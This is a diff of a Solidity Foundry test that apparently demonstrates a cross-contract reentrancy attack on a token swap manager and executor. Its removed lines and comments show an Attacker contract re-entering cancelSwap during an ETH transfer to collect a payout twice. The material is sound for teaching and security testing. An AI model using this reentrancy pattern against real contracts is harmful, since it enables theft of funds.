@@ -12,24 +12,30 @@ contract CrossContractTest is Test {
     MyToken myToken;
     Attacker attacker;
     address victim1 = makeAddr("victim1");
-    uint256 amount = 2;
+    uint256 amount = 1;
+    uint256 nonce;
 
     function setUp() public {
         myToken = new MyToken();
         victimContract1 = new CrossContractManager(address(myToken));
         victimContract2 = new CrossContractExecutor(address(victimContract1));
         attacker = new Attacker(address(victimContract1), address(victimContract2));
+        myToken.mint(address(attacker), 1);
+        vm.deal(address(victimContract2), 1 ether);
     }
 
     function test_crossContract() public {
-        vm.prank(victim1);
+        vm.startPrank(address(attacker));
+        myToken.approve(address(victimContract1), 1); //the attacker approves the manager to spend its tokens
         CrossContractManager(victimContract1).createSwap(amount);
-        assert(myToken.balanceOf(address(victimContract1)) == 98);
-        assert(myToken.balanceOf(address(victim1)) == 2);
-        vm.prank(address(attacker));
-        attacker.attack(amount);
-        assert(myToken.balanceOf(address(victimContract1)) == 94);
-        assert(myToken.balanceOf(address(attacker)) == 4); // attacker duplicated his amount
+        assert(myToken.balanceOf(address(CrossContractManager(victimContract1))) == 100);
+        assert(myToken.balanceOf(address(attacker)) == 0);
+        assert(address(attacker).balance == 0);
+
+        nonce = CrossContractManager(victimContract1).getNonce(); //1
+        CrossContractExecutor(victimContract2).executeSwap(nonce);
+        assert(address(attacker).balance == 0.1 ether);
+        vm.stopPrank();
     }
 }
 
@@ -43,13 +49,16 @@ contract Attacker {
         victimContract2 = _victimContract2;
     }
 
-    function attack(uint256 amount) external {
-        nonce = CrossContractManager(victimContract1).getNonce() +1 ;
-        CrossContractManager(victimContract1).createSwap(amount);
-        CrossContractManager(victimContract1).cancelSwap(nonce); //transfer 2 executed
-    }
+    receive() external payable {}
 
-    receive() external payable {
-        CrossContractExecutor(victimContract2).executeSwap(nonce); //transfer 1 executed
-    }
+    // fallback() external payable {
+    //     //when transfer arrives here, the pendingSwap[1] has not been deleted yet
+    //     //I can cancel the swap and get another transfer for free
+    //     // nonce = CrossContractManager(victimContract1).getNonce();
+    //     executeCancelSwap();
+    // }
+
+    // function executeCancelSwap() public {
+    //     CrossContractManager(victimContract1).cancelSwap(1);
+    // }
 }
